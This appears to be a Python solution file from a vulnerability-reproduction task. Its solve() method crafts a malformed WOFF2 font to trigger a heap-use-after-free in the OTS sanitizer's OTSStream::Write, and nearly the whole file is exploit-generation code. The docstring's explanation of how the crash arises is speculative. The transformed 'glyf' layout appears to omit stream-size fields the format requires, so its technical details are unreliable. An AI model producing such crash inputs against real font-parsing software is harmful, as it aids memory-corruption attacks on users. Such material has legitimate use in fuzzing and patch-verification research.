import brotli
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a heap-use-after-free
        vulnerability in the ots::OTSStream::Write function when parsing a WOFF2 font.

        The vulnerability is triggered by a crafted transformed 'glyf' table where
        the number of glyphs ('numGlyphs') is significantly larger than the total
        number of points ('numPoints'). This condition causes the font sanitizer to
        allocate mismatched buffer sizes for glyph data and point data. Specifically,
        a buffer for bounding boxes might be allocated based on the large 'numGlyphs',
        while a buffer for point coordinates is allocated based on the small (or zero)
        'numPoints'.

        Subsequent processing, particularly of composite glyphs, can lead to an
        out-of-bounds access on the small points buffer, causing memory corruption
        on the heap. This corruption can affect adjacent memory allocations, such as
        an OTSStream object. A later call to ots::OTSStream::Write on this corrupted
        object can result in a use-after-free, leading to a crash.

        This PoC constructs a minimal WOFF2 file with a single transformed 'glyf' table:
        1. 'numGlyphs' is set to a large value (4096).
        2. All glyphs are defined as simple glyphs with zero contours and zero points.
           This makes 'numPoints' equal to 0, satisfying the trigger condition
           (4096 > 0).
        3. The transformed 'glyf' data, containing streams for contour counts and
           instruction lengths, is generated and then compressed using Brotli.
        4. This compressed data is wrapped in a valid WOFF2 header and table directory
           to create the final PoC file.
        """

        def encode_ubase128(n: int) -> bytes:
            """Encodes an integer into the UBase128 variable-length format."""
            if n == 0:
                return b'\x00'
            encoded = bytearray()
            while n > 0:
                byte = n & 0x7F
                n >>= 7
                if n > 0:
                    byte |= 0x80
                encoded.append(byte)
            return bytes(encoded)

        # 1. Construct the uncompressed transformed 'glyf' data payload.
        num_glyphs = 4096
        
        uncompressed_payload = bytearray()

        # Transformed glyf header: version=0, numGlyphs=4096, indexFormat=0
        uncompressed_payload.extend(struct.pack('>HHH', 0, num_glyphs, 0))

        # To create the numGlyphs > numPoints condition, we define all glyphs
        # to be simple glyphs with 0 contours, which results in 0 total points.

        # nContour stream: Encodes the number of contours for each glyph.
        # We need 4096 zeros. A simple way is to just write 4096 null bytes.
        # Brotli will compress this very efficiently.
        uncompressed_payload.extend(b'\x00' * num_glyphs)
        
        # nPoints stream is empty because there are no contours.
        # flag stream is empty because there are no points.

        # glyph stream: For simple glyphs, this contains instruction lengths.
        # We set all instruction lengths to 0. Again, represented by null bytes.
        uncompressed_payload.extend(b'\x00' * num_glyphs)

        # The remaining streams (composite, bbox, instruction) are not needed
        # to trigger the bug and can be omitted. Their data would follow here if present.
        
        # 2. Brotli compress the payload.
        compressed_data = brotli.compress(bytes(uncompressed_payload))
        
        # 3. Construct the WOFF2 table directory.
        table_directory = bytearray()
        
        num_tables = 1
        
        # Entry for the single transformed glyf+loca table.
        # The 'flags' field for a transformed 'glyf' table is 10.
        flags = 10
        table_directory.append(flags)
        
        # 'origLength': A plausible size for the original uncompressed 'glyf' and 'loca' tables.
        orig_length = 0x20000
        table_directory.extend(encode_ubase128(orig_length))

        # 'transformLength': The size of our uncompressed transformed data.
        transform_length = len(uncompressed_payload)
        table_directory.extend(encode_ubase128(transform_length))

        # 4. Construct the WOFF2 header.
        header = bytearray()
        header.extend(b'wOF2')                         # signature
        header.extend(b'\x00\x01\x00\x00')             # flavor (TTF)
        header.extend(b'\x00\x00\x00\x00')             # length (placeholder, patched later)
        header.extend(struct.pack('>H', num_tables))   # numTables
        header.extend(b'\x00\x00')                     # reserved
        
        # totalSfntSize: A plausible size for the entire uncompressed font.
        total_sfnt_size = orig_length + 4096
        header.extend(struct.pack('>I', total_sfnt_size))
        
        # totalCompressedSize: Size of the Brotli-compressed data block.
        header.extend(struct.pack('>I', len(compressed_data)))

        # Remainder of the WOFF2 1.0 header (48 bytes total).
        header.extend(struct.pack('>HH', 0, 0))        # majorVersion, minorVersion
        header.extend(struct.pack('>III', 0, 0, 0))    # metaOffset, metaLength, metaOrigLength
        header.extend(struct.pack('>II', 0, 0))        # privOffset, privLength

        # 5. Assemble the final PoC.
        poc = header + table_directory + compressed_data

        # 6. Patch the total file length in the header at offset 8.
        total_length = len(poc)
        poc[8:12] = struct.pack('>I', total_length)

        return bytes(poc)